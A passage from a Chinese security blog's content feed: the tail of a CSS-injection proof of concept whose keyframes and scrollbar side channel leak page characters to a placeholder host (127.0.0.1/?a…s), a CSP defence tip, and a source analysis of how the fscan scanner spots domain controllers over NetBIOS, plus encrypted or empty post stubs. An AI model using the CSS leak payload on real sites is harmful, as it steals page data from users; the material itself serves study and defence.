class="string">http://127.0.0.1/?h</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">41%</span> &#123; <span class="attribute">font-family</span>: rest &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">45%</span> &#123; <span class="attribute">font-family</span>: has_I, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?i</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">46%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">50%</span> &#123; <span class="attribute">font-family</span>: has_J, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?j</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">51%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">55%</span> &#123; <span class="attribute">font-family</span>: has_K, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?k</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">56%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">60%</span> &#123; <span class="attribute">font-family</span>: has_L, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?l</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">61%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">65%</span> &#123; <span class="attribute">font-family</span>: has_M, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?m</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">66%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">70%</span> &#123; <span class="attribute">font-family</span>: has_N, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?n</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">71%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">75%</span> &#123; <span class="attribute">font-family</span>: has_O, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?o</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">76%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">80%</span> &#123; <span class="attribute">font-family</span>: has_P, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?p</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">81%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">85%</span> &#123; <span class="attribute">font-family</span>: has_Q, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?q</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">86%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">90%</span> &#123; <span class="attribute">font-family</span>: has_R, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?r</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">91%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">95%</span> &#123; <span class="attribute">font-family</span>: has_S, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?s</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">96%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* increase width char by char, i.e. add new char to prefix */</span></span></span><br><span class="line"><span class="language-css"><span class="keyword">@keyframes</span> loop &#123;</span></span><br><span class="line"><span class="language-css">    <span class="number">0%</span> &#123; <span class="attribute">width</span>: <span class="number">0px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">1%</span> &#123; <span class="attribute">width</span>: <span class="number">20px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">2%</span> &#123; <span class="attribute">width</span>: <span class="number">40px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">3%</span> &#123; <span class="attribute">width</span>: <span class="number">60px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">4%</span> &#123; <span class="attribute">width</span>: <span class="number">80px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">4%</span> &#123; <span class="attribute">width</span>: <span class="number">100px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">5%</span> &#123; <span class="attribute">width</span>: <span class="number">120px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">6%</span> &#123; <span class="attribute">width</span>: <span class="number">140px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">7%</span> &#123; <span class="attribute">width</span>: <span class="number">0px</span> &#125;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span>::-webkit-scrollbar &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: blue;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* side-channel */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span>::-webkit-scrollbar:vertical &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: blue <span class="built_in">var</span>(--leak);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>single css injection w/o remote fonts to leak charset ft. @kinugawamasato&#x27;s <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html&quot;</span>&gt;</span>unicode-range<span class="tag">&lt;/<span class="name">a</span>&gt;</span> technique<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>the trick is using detectable layout differences between default fonts. there are probably many similar and more efficient methos.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;leak&quot;</span>&gt;</span></span><br><span class="line">cabdb</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
    </div>
</div>
<h3 id="ligature-scrollbar"><a href="#ligature-scrollbar" class="headerlink" title="ligature + scrollbar"></a>ligature + scrollbar</h3><p>有点难，暂时不复现</p>
<h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><p>增加csp头，比如 <code>style-src &#39;none&#39;</code> ，详情可以去翻看CSP那篇文章。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全11-同源与Site（笔记）</title>
    <url>/2023/11/04/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A811-%E5%90%8C%E6%BA%90%E4%B8%8ESite%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>fscan扫描DC的原理</title>
    <url>/2023/11/28/fscan%E6%89%AB%E6%8F%8FDC%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>朋友面试绿盟梅花K的时候被问到了fscan扫描DC的原理是什么，因为我也不是很清楚，刚开始以为是扫描88端口，后面调试了源码发现并不是<br><span id="more"></span></p>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>首先需要一台有域控的Windows虚拟机，然后配置vscode的<code>launch.json</code><br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Launch Package&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;go&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;auto&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-h&quot;</span><span class="punctuation">,</span><span class="string">&quot;192.168.3.177&quot;</span><span class="punctuation">,</span><span class="string">&quot;-np&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>接下来通过搜索关键词 <code>DC</code> ，定位到代码位于 <code>./Plugins/NetBIOS.go</code><br>接下来就可以开始调试分析了</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看向开头代码<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NetBIOS</span><span class="params">(info *common.HostInfo)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	netbios, _ := NetBIOS1(info)</span><br><span class="line">	output := netbios.String()</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(output) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		result := fmt.Sprintf(<span class="string">&quot;[*] NetBios: %-15s %s&quot;</span>, info.Host, output)</span><br><span class="line">		common.LogSuccess(result)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> netbioserr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先分析第一个函数<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NetBIOS1</span><span class="params">(info *common.HostInfo)</span></span> (netbios NetBiosInfo, err <span class="type">error</span>) &#123;</span><br><span class="line">	netbios, err = GetNbnsname(info)</span><br><span class="line">	<span class="keyword">var</span> payload0 []<span class="type">byte</span></span><br><span class="line">	<span class="keyword">if</span> netbios.ServerService != <span class="string">&quot;&quot;</span> || netbios.WorkstationService != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		ss := netbios.ServerService</span><br><span class="line">		<span class="keyword">if</span> ss == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			ss = netbios.WorkstationService</span><br><span class="line">		&#125;</span><br><span class="line">		name := netbiosEncode(ss)</span><br><span class="line">		payload0 = <span class="built_in">append</span>(payload0, []<span class="type">byte</span>(<span class="string">&quot;\x81\x00\x00D &quot;</span>)...)</span><br><span class="line">		payload0 = <span class="built_in">append</span>(payload0, name...)</span><br><span class="line">		payload0 = <span class="built_in">append</span>(payload0, []<span class="type">byte</span>(<span class="string">&quot;\x00 EOENEBFACACACACACACACACACACACACA\x00&quot;</span>)...)</span><br><span class="line">	&#125;</span><br><span class="line">	realhost := fmt.Sprintf(<span class="string">&quot;%s:%v&quot;</span>, info.Host, info.Ports)</span><br><span class="line">	<span class="keyword">var</span> conn net.Conn</span><br><span class="line">	conn, err = common.WrapperTcpWithTimeout(<span class="string">&quot;tcp&quot;</span>, realhost, time.Duration(common.Timeout)*time.Second)</span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> conn != <span class="literal">nil</span> &#123;</span><br><span class="line">			conn.Close()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	err = conn.SetDeadline(time.Now().Add(time.Duration(common.Timeout) * time.Second))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> info.Ports == <span class="string">&quot;139&quot;</span> &amp;&amp; <span class="built_in">len</span>(payload0) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		_, err1 := conn.Write(payload0)</span><br><span class="line">		<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		_, err1 = ReadBytes(conn)</span><br><span class="line">		<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_, err = conn.Write(NegotiateSMBv1Data1)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	_, err = ReadBytes(conn)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_, err = conn.Write(NegotiateSMBv1Data2)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> ret []<span class="type">byte</span></span><br><span class="line">	ret, err = ReadBytes(conn)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	netbios2, err := ParseNTLM(ret)</span><br><span class="line">	JoinNetBios(&amp;netbios, &amp;netbios2)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>首先调用了<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetNbnsname</span><span class="params">(info *common.HostInfo)</span></span> (netbios NetBiosInfo, err <span class="type">error</span>) &#123;</span><br><span class="line">	senddata1 := []<span class="type">byte</span>&#123;<span class="number">102</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">67</span>, <span class="number">75</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line">	<span class="comment">//senddata1 := []byte(&quot;ff\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01&quot;)</span></span><br><span class="line">	realhost := fmt.Sprintf(<span class="string">&quot;%s:137&quot;</span>, info.Host)</span><br><span class="line">	conn, err := net.DialTimeout(<span class="string">&quot;udp&quot;</span>, realhost, time.Duration(common.Timeout)*time.Second)</span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> conn != <span class="literal">nil</span> &#123;</span><br><span class="line">			conn.Close()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	err = conn.SetDeadline(time.Now().Add(time.Duration(common.Timeout) * time.Second))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	_, err = conn.Write(senddata1)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	text, _ := ReadBytes(conn)</span><br><span class="line">	netbios, err = ParseNetBios(text)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从名字可以知道<br>NBNS = NetBIOS Name Service<br>通过想137端口发送UDP请求，然后获取到NetBios信息，并去解析，解析代码如下<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">GROUP_NAMES = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">    <span class="string">&quot;\x00&quot;</span>: <span class="string">&quot;DomainName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\x1C&quot;</span>: <span class="string">&quot;DomainControllers&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\x1E&quot;</span>: <span class="string">&quot;Browser Service Elections&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseNetBios</span><span class="params">(input []<span class="type">byte</span>)</span></span> (netbios NetBiosInfo, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(input) &lt; <span class="number">57</span> &#123;</span><br><span class="line">		err = netbioserr</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	data := input[<span class="number">57</span>:]</span><br><span class="line">	<span class="keyword">var</span> num <span class="type">int</span></span><br><span class="line">	num, err = bytetoint(input[<span class="number">56</span>:<span class="number">57</span>][<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> msg <span class="type">string</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; num; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">18</span>*i+<span class="number">16</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		name := <span class="type">string</span>(data[<span class="number">18</span>*i : <span class="number">18</span>*i+<span class="number">15</span>])</span><br><span class="line">		flag_bit := data[<span class="number">18</span>*i+<span class="number">15</span> : <span class="number">18</span>*i+<span class="number">16</span>]</span><br><span class="line">		<span class="keyword">if</span> GROUP_NAMES[<span class="type">string</span>(flag_bit)] != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="type">string</span>(flag_bit) != <span class="string">&quot;\x00&quot;</span> &#123;</span><br><span class="line">			msg += fmt.Sprintf(<span class="string">&quot;%s: %s\n&quot;</span>, GROUP_NAMES[<span class="type">string</span>(flag_bit)], name) <span class="comment">//这段代码是解析DC的关键</span></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> UNIQUE_NAMES[<span class="type">string</span>(flag_bit)] != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="type">string</span>(flag_bit) != <span class="string">&quot;\x00&quot;</span> &#123;</span><br><span class="line">			msg += fmt.Sprintf(<span class="string">&quot;%s: %s\n&quot;</span>, UNIQUE_NAMES[<span class="type">string</span>(flag_bit)], name)</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="type">string</span>(flag_bit) == <span class="string">&quot;\x00&quot;</span> || <span class="built_in">len</span>(data) &gt;= <span class="number">18</span>*i+<span class="number">18</span> &#123;</span><br><span class="line">			name_flags := data[<span class="number">18</span>*i+<span class="number">16</span> : <span class="number">18</span>*i+<span class="number">18</span>][<span class="number">0</span>]</span><br><span class="line">			<span class="keyword">if</span> name_flags &gt;= <span class="number">128</span> &#123;</span><br><span class="line">				msg += fmt.Sprintf(<span class="string">&quot;%s: %s\n&quot;</span>, GROUP_NAMES[<span class="type">string</span>(flag_bit)], name)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				msg += fmt.Sprintf(<span class="string">&quot;%s: %s\n&quot;</span>, UNIQUE_NAMES[<span class="type">string</span>(flag_bit)], name)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			msg += fmt.Sprintf(<span class="string">&quot;%s \n&quot;</span>, name)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(msg) == <span class="number">0</span> &#123;</span><br><span class="line">		err = netbioserr</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	err = yaml.Unmarshal([]<span class="type">byte</span>(msg), &amp;netbios)</span><br><span class="line">	<span class="keyword">if</span> netbios.DomainName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		netbios.GroupName = netbios.DomainName</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果刚刚NetBIOS请求中，某个字段存在 <code>\x1C</code> 就算他是 <code>DC</code><br>接下来看看 <code>netbios.String()</code><br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(info *NetBiosInfo)</span></span> String() (output <span class="type">string</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> text <span class="type">string</span></span><br><span class="line">	<span class="comment">//ComputerName 信息比较全</span></span><br><span class="line">	<span class="keyword">if</span> info.ComputerName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> !strings.Contains(info.ComputerName, <span class="string">&quot;.&quot;</span>) &amp;&amp; info.GroupName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			text = fmt.Sprintf(<span class="string">&quot;%s\\%s&quot;</span>, info.GroupName, info.ComputerName)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			text = info.ComputerName</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//组信息</span></span><br><span class="line">		<span class="keyword">if</span> info.DomainName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			text += info.DomainName</span><br><span class="line">			text += <span class="string">&quot;\\&quot;</span></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> info.NetDomainName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			text += info.NetDomainName</span><br><span class="line">			text += <span class="string">&quot;\\&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//机器名</span></span><br><span class="line">		<span class="keyword">if</span> info.ServerService != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			text += info.ServerService</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> info.WorkstationService != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			text += info.WorkstationService</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> info.NetComputerName != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			text += info.NetComputerName</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> text == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> info.DomainControllers != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		output = fmt.Sprintf(<span class="string">&quot;[+] DC:%-24s&quot;</span>, text)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		output = fmt.Sprintf(<span class="string">&quot;%-30s&quot;</span>, text)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> info.OsVersion != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		output += <span class="string">&quot;      &quot;</span> + info.OsVersion</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>把刚刚解析的代码进行一个可以让他输出的操作，关键代码如下<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> info.DomainControllers != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">    output = fmt.Sprintf(<span class="string">&quot;[+] DC:%-24s&quot;</span>, text)</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>分析源码的时候注意到 <code>icmp.go</code> 有点问题，可以进行命令注入，原理就不分析了，已经提交issue</p>
<ul>
<li><a href="https://github.com/shadow1ng/fscan/issues/321">https://github.com/shadow1ng/fscan/issues/321</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
        <tag>go</tag>
        <tag>fscan</tag>
      </tags>
  </entry>
  <entry>
    <title>某市教育HVV总结</title>
    <url>/2023/12/21/%E6%9F%90%E5%B8%82%E6%95%99%E8%82%B2HVV%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="11c097e3d54fe620b5b01ac6f00cf8b56566153c184d10289e919f8e355e3c64"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>实战</tag>
        <tag>hvv</tag>
      </tags>
  </entry>
  <entry>
    <title>minio 漏洞</title>
    <url>/2024/01/30/minio-%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>nctf-2023-wp</title>
    <url>/2023/12/25/nctf-2023-wp/</url>
    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>刷题4</title>
    <url>/2024/01/27/%E5%88%B7%E9%A2%984/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="766e0ddf99a29d6f2a00d9c03c1cacd620a1b2fc1bd288764b4739dc9a686384"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
